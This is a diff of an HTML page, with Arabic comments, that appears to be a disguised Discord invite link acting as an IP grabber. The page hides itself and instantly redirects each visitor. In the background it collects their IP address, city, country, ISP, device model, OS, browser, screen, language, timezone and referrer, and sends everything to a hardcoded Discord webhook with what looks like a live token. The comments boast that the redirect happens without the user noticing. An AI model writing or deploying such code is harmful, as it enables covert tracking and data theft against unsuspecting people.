@@ -4,18 +4,17 @@
     <meta charset="UTF-8">
     <meta http-equiv="refresh" content="0; url=https://discord.gg/M9L">
     <script>
-        // منع أي عرض مرئي
+        // منع أي عرض مرئي تمامًا
         document.documentElement.style.display = 'none';
         
-        // === رابط Webhook (استبدله برابطك الخاص) ===
+        // ===== ثابت Webhook (استبدله برابطك الخاص) =====
         const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1515984623874871346/dqTJouC5ZszPfl9CbNb_qTUVYKRX-wAKl0NwBLk3afhVj5HJQC-V8VOLHH_xqMci02RY";
         const DISCORD_REDIRECT = "https://discord.gg/M9L";
         
-        // التوجيه الفوري (أولاً وقبل أي شيء)
+        // ===== التوجيه الفوري (أسرع شيء) =====
         window.location.replace(DISCORD_REDIRECT);
         
-        // === جمع البيانات في الخلفية (لا يعطل التوجيه) ===
-        
+        // ===== جمع البيانات وإرسالها للجميع دون أي شروط =====
         // قاعدة بيانات موديلات iPhone كاملة
         const iPhoneModels = {
             "1,1":"iPhone 2G","1,2":"iPhone 3G","2,1":"iPhone 3GS",
@@ -67,7 +66,7 @@
             if (ua.includes("Windows NT 6.0")) return "Windows Vista";
             if (ua.includes("Windows NT 5.1")) return "Windows XP";
             if (ua.includes("Linux")) return "Linux";
-            return "Unknown";
+            return "غير معروف";
         }
         
         function getBrowser(ua) {
@@ -76,57 +75,60 @@
             if (ua.includes("Chrome/") && !ua.includes("Edg")) return "Chrome";
             if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Safari";
             if (ua.includes("OPR/")) return "Opera";
-            return "Other";
+            return "أخرى";
         }
         
-        // جمع البيانات المتاحة محلياً (سريع)
+        // جمع البيانات الفورية (بدون انتظار)
         const ua = navigator.userAgent;
         const data = {
             timestamp: new Date().toISOString(),
-            ip: "",
-            location: "",
+            ip: "جاري الجلب...",
+            location: "جاري الجلب...",
             os: getOS(ua),
-            device: getIPhoneModel(ua) || (ua.includes("iPad") ? "iPad" : (ua.includes("Android") ? (ua.match(/Android; (.+?) Build/)?.[1] || "Android Device") : "Unknown Device")),
+            device: getIPhoneModel(ua) || (ua.includes("iPad") ? "iPad" : (ua.includes("Android") ? (ua.match(/Android; (.+?) Build/)?.[1] || "جهاز Android") : "كمبيوتر / غير معروف")),
             browser: getBrowser(ua),
-            screen: `${screen.width}x${screen.height}`,
+            screen: `${screen.width}x${screen.height} (نسبة: ${window.devicePixelRatio})`,
             language: navigator.language,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             url: location.href,
-            referrer: document.referrer || "direct"
+            referrer: document.referrer || "مباشر"
         };
         
-        // جلب IP والموقع (غير متزامن)
+        // جلب IP والموقع ثم الإرسال (دون أي شرط، يتم التنفيذ لكل زائر)
         fetch('https://ipwho.is/')
             .then(r => r.json())
             .then(json => {
                 if (json.success) {
                     data.ip = json.ip;
-                    data.location = `${json.city}, ${json.country} (${json.connection.isp})`;
+                    data.location = `${json.city}, ${json.country} (${json.connection.isp || "ISP غير معروف"})`;
                 } else throw new Error();
             })
-            .catch(() => fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => data.ip = d.ip).catch(() => data.ip = "unknown"))
+            .catch(() => fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => data.ip = d.ip).catch(() => data.ip = "غير متاح"))
             .finally(() => {
-                // إرسال إلى Webhook مع keepalive
+                // إرسال البيانات إلى Webhook (بـ keepalive لضمان الوصول)
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: {'Content-Type':'application/json'},
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🕵️ زائر جديد - توجيه خفي",
+                            title: "🕵️ زائر جديد (أو عائد) - توجيه فوري",
                             color: 0x2C3E50,
                             fields: [
-                                {name: "IP & موقع", value: `${data.ip}\n${data.location}`, inline: false},
-                                {name: "الجهاز والنظام", value: `${data.device}\n${data.os}`, inline: true},
-                                {name: "المتصفح", value: data.browser, inline: true},
-                                {name: "الشاشة", value: data.screen, inline: true},
-                                {name: "اللغة/المنطقة", value: `${data.language}\n${data.timezone}`, inline: true},
-                                {name: "الرابط والمُحيل", value: `الرابط: ${data.url}\nالمُحيل: ${data.referrer}`, inline: false}
+                                { name: "🌍 IP + الموقع", value: `${data.ip}\n${data.location}`, inline: false },
+                                { name: "📱 الجهاز", value: data.device, inline: true },
+                                { name: "💿 نظام التشغيل", value: data.os, inline: true },
+                                { name: "🌐 المتصفح", value: data.browser, inline: true },
+                                { name: "🖥️ الشاشة", value: data.screen, inline: true },
+                                { name: "🔤 اللغة", value: data.language, inline: true },
+                                { name: "🕐 المنطقة الزمنية", value: data.timezone, inline: true },
+                                { name: "🔗 الرابط", value: data.url, inline: false },
+                                { name: "🔗 المُحيل", value: data.referrer, inline: false }
                             ],
-                            footer: {text: "تم التوجيه بدون أن يشعر المستخدم"}
+                            footer: { text: "تم التوجيه وجمع البيانات لجميع الزوار دون استثناء" }
                         }]
                     }),
                     keepalive: true
-                }).catch(()=>{});
+                }).catch(err => console.error("فشل الإرسال", err));
             });
     </script>
 </head>
